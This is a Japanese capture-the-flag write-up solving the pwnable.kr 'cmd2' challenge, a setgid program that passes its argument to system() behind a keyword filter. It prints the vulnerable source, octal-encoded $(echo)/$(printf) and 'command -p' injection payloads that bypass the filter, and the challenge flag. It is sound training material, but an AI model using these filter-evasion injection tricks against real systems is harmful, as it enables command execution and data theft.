# 内容
まずはログインしてみる。
* パスワードはcmd1のフラグ。毎度同じのguestと入力しないように。

```bash
sh cmd2@pwnable.kr -p2222
cmd2@pwnable.kr's password:
 ____  __    __  ____    ____  ____   _        ___      __  _  ____
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|

- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
Last login: Tue Jul 30 17:08:28 2019 from 49.135.83.29
cmd2@prowl:~$ ls
cmd2  cmd2.c  flag
cmd2@prowl:~$ ls -la
total 40
drwxr-x---   5 root cmd2     4096 Oct 23  2016 .
drwxr-xr-x 114 root root     4096 May 19 15:59 ..
d---------   2 root root     4096 Jul 14  2015 .bash_history
-r-xr-sr-x   1 root cmd2_pwn 8794 Dec 21  2015 cmd2
-rw-r--r--   1 root root      586 Dec 21  2015 cmd2.c
-r--r-----   1 root cmd2_pwn   30 Jul 14  2015 flag
dr-xr-xr-x   2 root root     4096 Jul 22  2015 .irssi
drwxr-xr-x   2 root root     4096 Oct 23  2016 .pwntools-cache
cmd2@prowl:~$ ./cmd2
Segmentation fault (core dumped)
cmd2@prowl:~$ cat ./cmd2
cmd2    cmd2.c
cmd2@prowl:~$ cat ./cmd2.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}

cmd2@prowl:~$
```

最初のdelete_env()でなにをしているかはわからないが、前回のcmd1よりfilterが強化されているのが分かる。
まず、exportや/は使えなくなっている時点で、前回のようにはいかない。
そこで、**/bin/cat flag**を16進数で出力することを考える。

# 手順
文字列を16進数に変換するときはxxd, echo, printf等が代表的で、今回はechoを使用する。

## echoで16進数に変更する方法
echoで16進数に変換するのはshとbashで方法が少し異なる。
* echoの特殊文字は8進数です！！！なので、１６進数から変換するのが良いと思います。
1. bash
	*  オプションeが必要。
  * ２バイトと書かないといけない？

```bash
cmd2@prowl:~$ echo -e "\0057"
/
cmd2@prowl:~$ echo -e "\57"
\57
cmd2@prowl:~$ echo -e \0057
0057
```

2. sh
	* オプションは必要なし、ていうか無い。
  * １バイトだけで良い
```bash
echo -e
-e
$ echo "\57"
/
$ echo "\0057"
/
``` 

以上を用いて、解答していく。

# 解答
16進数から8進数に変換するコードを書いた。

```python
def main():
  s = "/bin/cat flag"
  ans = "\""
  for i in s:
    ans += "\\" + str( oct( ord(i) ) )
  ans += "\""
  print(ans.replace("0o", ""))
if __name__ == '__main__':
  main()
```

```bash
$ python3 sol.py
"\57\142\151\156\57\143\141\164\40\146\154\141\147"
```

後は実行するだけ。

```bash
cmd2@prowl:~$ ./cmd2 '$(echo "\57\142\151\156\57\143\141\164\40\146\154\141\147")'
$(echo "\57\142\151\156\57\143\141\164\40\146\154\141\147")
FuN_w1th_5h3ll_v4riabl3s_haha
```

因みに、printfも特殊文字は８進数で書けるので、同じように実行すれば、フラグをゲットできる。

```bash
cmd2@prowl:~$ ./cmd2 '$(printf "\57\142\151\156\57\143\141\164\40\146\154\141\147")'
$(printf "\57\142\151\156\57\143\141\164\40\146\154\141\147")
FuN_w1th_5h3ll_v4riabl3s_haha
```


フラグゲット。

# 別解
system関数はmanで調べると、shで実行されていることが分かる。

```text
CRIPTION
       The system() library function uses fork(2) to create a child process that executes the shell command specified in command using execl(3) as follows:

           execl("/bin/sh", "sh", "-c", command, (char *) 0);

       system() returns after the command has been completed.

       During  execution  of  the command, SIGCHLD will be blocked, and SIGINT and SIGQUIT will be ignored, in the process that calls system() (these signals will be handled according to their defaults inside the child process that
       executes command).

       If command is NULL, then system() returns a status indicating whether a shell is available on the system
```


さらに、ここで気づくのが、実際にsystem関数を実行したら、commandコマンド(なんかややこしい)を実行していることがわかる。

このcommandコマンドはshellの組み込みコマンドで、"sh -c"と同じように動くらしい(間違えてるかも・・・)。
shのmanを見ると、使い方が載っている。

```text
command [-p] [-v] [-V] command [arg ...]
            Execute the specified command but ignore shell functions when searching for it.  (This is useful when you have a shell function with the same name as a builtin command.)

            -p     search for command using a PATH that guarantees to find all the standard utilities.

            -V     Do not execute the command but search for the command and print the resolution of the command search.  This is the same as the type builtin.

            -v     Do not execute the command but search for the command and print the absolute pathname of utilities, the name for builtins or the expansion of aliases.

```

つまり、実は16進数に変更しなくてもこのcommandコマンドを使用すれば、filter関数を回避できる。

```bash
cmd2@prowl:~$ ./cmd2 '$(command -p cat f*)'
$(command -p cat f*)
sh: 1: FuN_w1th_5h3ll_v4riabl3s_haha: not found
```

```bash
cmd2@prowl:~$ ./cmd2 "command -p cat \"f\"\"l\"\"a\"\"g\" "
command -p cat "f""l""a""g"
FuN_w1th_5h3ll_v4riabl3s_haha

```

```bash
cmd2@prowl:~$ ./cmd2 "command -p cat f*"
command -p cat f*
FuN_w1th_5h3ll_v4riabl3s_haha
```

もっといろいろ解法はある気がするが、疲れたので、やめる。
